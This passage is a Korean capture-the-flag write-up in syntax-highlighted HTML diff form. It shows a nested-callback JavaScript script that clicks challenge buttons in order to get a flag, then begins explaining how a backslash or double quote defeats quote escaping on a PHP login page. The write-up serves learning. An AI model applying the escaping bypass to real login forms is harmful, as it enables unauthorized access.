syntax--js"><span>"</span></span><span>[onclick='click_button(6, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                        </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--support syntax--function syntax--js"><span>setTimeout</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--meta syntax--function syntax--js"><span class="syntax--storage syntax--type syntax--function syntax--js"><span>function</span></span><span class="syntax--meta syntax--parameters syntax--js"><span class="syntax--punctuation syntax--definition syntax--parameters syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--parameters syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span> </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--begin syntax--bracket syntax--curly syntax--js"><span>{</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                            </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(7, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                            </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--support syntax--function syntax--js"><span>setTimeout</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--meta syntax--function syntax--js"><span class="syntax--storage syntax--type syntax--function syntax--js"><span>function</span></span><span class="syntax--meta syntax--parameters syntax--js"><span class="syntax--punctuation syntax--definition syntax--parameters syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--parameters syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span> </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--begin syntax--bracket syntax--curly syntax--js"><span>{</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                                </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(8, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                                </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--support syntax--function syntax--js"><span>setTimeout</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--meta syntax--function syntax--js"><span class="syntax--storage syntax--type syntax--function syntax--js"><span>function</span></span><span class="syntax--meta syntax--parameters syntax--js"><span class="syntax--punctuation syntax--definition syntax--parameters syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--parameters syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span> </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--begin syntax--bracket syntax--curly syntax--js"><span>{</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                                    </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(9, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                                    </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--support syntax--function syntax--js"><span>setTimeout</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--meta syntax--function syntax--js"><span class="syntax--storage syntax--type syntax--function syntax--js"><span>function</span></span><span class="syntax--meta syntax--parameters syntax--js"><span class="syntax--punctuation syntax--definition syntax--parameters syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--parameters syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span> </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--begin syntax--bracket syntax--curly syntax--js"><span>{</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                                        </span><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(10, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                                    </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--end syntax--bracket syntax--curly syntax--js"><span>}</span></span><span class="syntax--meta syntax--delimiter syntax--object syntax--comma syntax--js"><span>,</span></span><span> </span><span class="syntax--constant syntax--numeric syntax--decimal syntax--js"><span>15</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                                </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--end syntax--bracket syntax--curly syntax--js"><span>}</span></span><span class="syntax--meta syntax--delimiter syntax--object syntax--comma syntax--js"><span>,</span></span><span> </span><span class="syntax--constant syntax--numeric syntax--decimal syntax--js"><span>15</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                            </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--end syntax--bracket syntax--curly syntax--js"><span>}</span></span><span class="syntax--meta syntax--delimiter syntax--object syntax--comma syntax--js"><span>,</span></span><span> </span><span class="syntax--constant syntax--numeric syntax--decimal syntax--js"><span>15</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                        </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--end syntax--bracket syntax--curly syntax--js"><span>}</span></span><span class="syntax--meta syntax--delimiter syntax--object syntax--comma syntax--js"><span>,</span></span><span> </span><span class="syntax--constant syntax--numeric syntax--decimal syntax--js"><span>15</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                    </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--end syntax--bracket syntax--curly syntax--js"><span>}</span></span><span class="syntax--meta syntax--delimiter syntax--object syntax--comma syntax--js"><span>,</span></span><span> </span><span class="syntax--constant syntax--numeric syntax--decimal syntax--js"><span>15</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>                </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--end syntax--bracket syntax--curly syntax--js"><span>}</span></span><span class="syntax--meta syntax--delimiter syntax--object syntax--comma syntax--js"><span>,</span></span><span> </span><span class="syntax--constant syntax--numeric syntax--decimal syntax--js"><span>15</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>            </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--end syntax--bracket syntax--curly syntax--js"><span>}</span></span><span class="syntax--meta syntax--delimiter syntax--object syntax--comma syntax--js"><span>,</span></span><span> </span><span class="syntax--constant syntax--numeric syntax--decimal syntax--js"><span>15</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>        </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--end syntax--bracket syntax--curly syntax--js"><span>}</span></span><span class="syntax--meta syntax--delimiter syntax--object syntax--comma syntax--js"><span>,</span></span><span> </span><span class="syntax--constant syntax--numeric syntax--decimal syntax--js"><span>15</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span>    </span><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--end syntax--bracket syntax--curly syntax--js"><span>}</span></span><span class="syntax--meta syntax--delimiter syntax--object syntax--comma syntax--js"><span>,</span></span><span> </span><span class="syntax--constant syntax--numeric syntax--decimal syntax--js"><span>15</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span></span></span>
+<span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--function syntax--body syntax--end syntax--bracket syntax--curly syntax--js"><span>}</span></span><span class="syntax--meta syntax--delimiter syntax--object syntax--comma syntax--js"><span>,</span></span><span> </span><span class="syntax--constant syntax--numeric syntax--decimal syntax--js"><span>15</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--punctuation syntax--terminator syntax--statement syntax--js"><span>;</span></span></span>
+</pre>
+<ul>
+<li>
+<p>콜백함수를 사용하니 바로 플래그가 나왔다.</p>
+</li>
+<li>
+<h3>javascript 코드 해설</h3>
+</li>
+<li>
+<p>플래그를 얻기 위해서는 꼭 버튼을 순서대로 눌러 인증서버에 버튼의 순서대로 인증을 해야한다.</p>
+</li>
+<li>
+<p>자바스크립트 특성인 비동기식 코드실행때문에 콜백함수를 사용하지 않으면 언제든 순서가 바뀔수 있다고 생각한다.</p>
+</li>
+<li>
+<p>그러나 payload 1 과 payload 2의 경우 첫번째 줄 코드가 실행된 뒤 결과를 기다리지 않고 바로
+두번째 줄 코드를 실행하게 된다. 그렇게 된다면 비동기식 코드 실행에 의해  두번째 코드가 먼저 결과가 나오게 될 수 도 있다.
+그렇게 된다면 플래그가 나올수 없게 되는 것이다. 그렇기 때문에 코드실행의 순서를 강제하기 위해 콜백함수를 사용하여야 한다.</p>
+</li>
+<li>
+<h4>payload 4</h4>
+</li>
+<li>
+<p>tab + enter 키를 10번 누르면 플래그가 나온다.</p>
+</li>
+<li>
+<p>html코드에서 button태그의 순서를 랜덤으로 하지 않아서 가능했던 풀이 방법이다.</p>
+</li>
+</ul>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<h2>Simple Login</h2>
+<ul>
+<li>매우 심플한 로그인이다.</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Circler-K/writeup/master/CTF/sunrinHD2018/image/1.PNG" alt="Alt text"></p>
+<ul>
+<li>로그인 버튼 옆에 source라는 버튼을 누르면 페이지의 소스코드를 줄 것같이 생겼다.</li>
+<li>그래서 눌렀다.</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Circler-K/writeup/master/CTF/sunrinHD2018/image/2.PNG" alt="Alt text"></p>
+<ul>
+<li>single qoute를 \\’ 로 바꿔준다.</li>
+<li>백슬래시는 바로 뒤에있는 문자하나를 텍스트로 인식시킨다.</li>
+<li>그러면 실제도 코드상에서 동작할때는 \’ 로 동작하기 때문에 내가 입력한 single qoute 가 백슬래시의 특성으로 인해 텍스트로 인식해 작동하지 않게 된다.</li>
+</ul>
+<br>
+<br>
+<br>
+<ul>
+<li>
+<p>그러나 우리는 double qoute를 사용할 것이다.</p>
+</li>
+<li>
+<p>PHP 5.2.12 -&gt; 5.3버전에서 기본 옵션인 magic_qoute_gpc가 사라지게 되었다.</p>
+</li>
+<li>
+<p>즉, PHP가 기본적으로 쿠기, REQUEST로 받아오는 값들에 대해 싱글,더블쿼더 + 백슬래시 필터링을 하지 않는다.</p>
+</li>
+<li>
+<p>그러므로 우리는 역슬래시를 이용하여 풀 수 있다.</p>
+</li>
+</ul>
+<br>
+<pre class="editor-colors lang-php"><span class="syntax--text syntax--html syntax--php"><span class="syntax--meta syntax--embedded syntax--block syntax--php"><span class="syntax--punctuation syntax--section syntax--embedded syntax--begin syntax--php"><span>&lt;?php</span></span></span></span>
